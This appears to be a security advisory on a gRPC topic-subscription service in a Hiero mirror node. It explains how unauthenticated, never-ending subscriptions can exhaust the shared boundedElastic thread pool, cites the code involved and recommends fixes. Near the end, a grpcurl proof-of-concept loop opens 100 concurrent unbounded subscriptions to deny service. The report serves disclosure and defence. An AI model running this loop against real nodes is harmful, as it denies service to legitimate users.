### Title
Unauthenticated Unbounded gRPC Topic Subscription Exhausts `boundedElastic` Scheduler Threads, Denying Service to Legitimate Subscribers

### Summary
`TopicMessageServiceImpl.subscribeTopic()` accepts subscriptions from any unauthenticated client with no global concurrent-subscription cap. When a subscription carries no `endTime` and no `limit`, the server-side reactive pipeline never terminates: `pastEndTime()` returns `Flux.never()` and `isComplete()` always returns `false`. Every such subscription continuously occupies threads on the shared `boundedElastic` scheduler (via `SharedTopicListener.publishOn` and the per-subscription `safetyCheck.subscribeOn`), allowing an attacker to saturate the scheduler and starve legitimate subscribers.

### Finding Description

**Code path 1 – no termination signal when `endTime == null`**

`pastEndTime()` at lines 123–125 returns `Flux.never()` when `filter.getEndTime() == null`:

```java
private Flux<Object> pastEndTime(TopicContext topicContext) {
    if (topicContext.getFilter().getEndTime() == null) {
        return Flux.never();   // subscription never terminates server-side
    }
    ...
}
``` [1](#0-0) 

`isComplete()` at lines 203–204 also returns `false` unconditionally when `endTime == null`:

```java
if (filter.getEndTime() == null) {
    return false;
}
``` [2](#0-1) 

**Code path 2 – `safetyCheck` fires on `boundedElastic` for every subscription**

Because `isComplete()` returns `false`, the `safetyCheck` filter passes and `missingMessages` is dispatched on `Schedulers.boundedElastic()` for every open subscription:

```java
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
    .filter(_ -> !topicContext.isComplete())          // always true when endTime==null
    .flatMapMany(_ -> missingMessages(topicContext, null))
    .subscribeOn(Schedulers.boundedElastic());        // occupies a boundedElastic thread
``` [3](#0-2) 

**Code path 3 – live message delivery uses `publishOn(boundedElastic)` per subscriber**

`SharedTopicListener.listen()` routes every subscriber's live message stream through `boundedElastic`:

```java
.publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
``` [4](#0-3) 

On a high-volume topic this keeps a `boundedElastic` thread busy for the lifetime of each subscription.

**Code path 4 – `PollingTopicMessageRetriever` creates its own `boundedElastic` scheduler**

The retriever (called from `missingMessages`) creates a dedicated `Schedulers.boundedElastic()` and schedules all polling on it:

```java
scheduler = Schedulers.boundedElastic();
...
.repeatWhen(RepeatSpec.create(...).withScheduler(scheduler))
.timeout(retrieverProperties.getTimeout(), scheduler)
``` [5](#0-4) [6](#0-5) 

**Root cause – no authentication, no global subscription cap**

`subscribeTopic()` performs zero authentication. The only identity check is `topicExists()`, which verifies the topic is a valid `TOPIC` entity — not the caller's identity. [7](#0-6) 

`subscriberCount` is a Micrometer gauge only — it is never compared against a maximum to reject new subscriptions. [8](#0-7) 

**Existing check shown insufficient**

`maxConcurrentCallsPerConnection = 5` limits calls *per TCP connection*, not total across all connections. [9](#0-8) 

An attacker opens N connections and issues 5 calls each, yielding 5N concurrent indefinite subscriptions with no server-side enforcement. [10](#0-9) 

### Impact Explanation
The `boundedElastic` scheduler defaults to `10 × CPU_cores` threads. With enough concurrent unbounded subscriptions, all threads are occupied dispatching live messages and running safety-check gap queries. New legitimate subscriptions that require a `boundedElastic` thread (e.g., their own `safetyCheck` or `publishOn` dispatch) are queued or rejected. On a high-volume topic the thread pool saturates quickly, causing complete denial of service to all legitimate subscribers. Memory also grows linearly with subscriber count due to per-subscription `TopicContext` state and per-subscriber backpressure buffers (`maxBufferSize = 16384` messages each). [11](#0-10) 

### Likelihood Explanation
The gRPC port (default 5600) is publicly reachable. No credentials, tokens, or API keys are required. The attack requires only a standard gRPC client (e.g., `grpcurl`) and the ability to open multiple TCP connections — trivially achievable from a single machine or a small botnet. The attack is repeatable and persistent: subscriptions remain open until the attacker disconnects, and reconnecting immediately re-establishes them.

### Recommendation
1. **Enforce a global concurrent-subscription cap**: compare `subscriberCount` against a configurable maximum before accepting a new subscription; return `RESOURCE_EXHAUSTED` if exceeded.
2. **Enforce a per-IP or per-authenticated-identity subscription limit** using a gRPC `ServerInterceptor`.
3. **Require authentication** on the `subscribeTopic` endpoint (e.g., bearer token or mTLS) so unauthenticated clients are rejected before any reactive pipeline is assembled.
4. **Mandate a maximum subscription duration**: reject or auto-terminate subscriptions with no `endTime` after a configurable idle/wall-clock timeout.
5. **Isolate `boundedElastic` schedulers** per concern (listener vs. retriever vs. safety-check) with explicit thread-count caps to limit blast radius.

### Proof of Concept

```bash
# Step 1: identify a high-volume topic (e.g., topicNum 41110 on mainnet mirror)
# Step 2: open 20 connections, 5 subscriptions each = 100 concurrent unbounded subscriptions
for i in $(seq 1 20); do
  for j in $(seq 1 5); do
    grpcurl -plaintext \
      -d '{"topicID": {"topicNum": 41110}}' \
      <mirror-node-host>:5600 \
      com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &
  done
done

# Step 3: observe via metrics that hiero.mirror.grpc.subscribers climbs to 100
# Step 4: attempt a new legitimate subscription — it will stall or fail with
#         RejectedExecutionException / timeout as boundedElastic threads are saturated
grpcurl -plaintext \
  -d '{"topicID": {"topicNum": 41110}, "limit": 1}' \
  <mirror-node-host>:5600 \
  com.hedera.mirror.api.proto.ConsensusService/subscribeTopic
# Expected: hangs or errors; legitimate subscriber is denied service
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-55)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L67-70)
```java
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L94-106)
```java
    private Mono<?> topicExists(TopicMessageFilter filter) {
        var topicId = filter.getTopicId();
        return Mono.justOrEmpty(entityRepository.findById(topicId.getId()))
                .switchIfEmpty(
                        grpcProperties.isCheckTopicExists()
                                ? Mono.error(new EntityNotFoundException(topicId))
                                : Mono.just(Entity.builder()
                                        .memo("")
                                        .type(EntityType.TOPIC)
                                        .build()))
                .filter(e -> e.getType() == EntityType.TOPIC)
                .switchIfEmpty(Mono.error(new IllegalArgumentException("Not a valid topic")));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L123-125)
```java
    private Flux<Object> pastEndTime(TopicContext topicContext) {
        if (topicContext.getFilter().getEndTime() == null) {
            return Flux.never();
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L203-205)
```java
        boolean isComplete() {
            if (filter.getEndTime() == null) {
                return false;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/SharedTopicListener.java (L25-25)
```java
                .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L41-41)
```java
        scheduler = Schedulers.boundedElastic();
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L51-59)
```java
        return Flux.defer(() -> poll(context))
                .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
                        .jitter(0.1)
                        .withFixedDelay(context.getFrequency())
                        .withScheduler(scheduler))
                .name(METRIC)
                .tap(Micrometer.observation(observationRegistry))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)))
                .timeout(retrieverProperties.getTimeout(), scheduler)
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-34)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/ListenerProperties.java (L22-23)
```java
    @Max(65536)
    private int maxBufferSize = 16384;
```
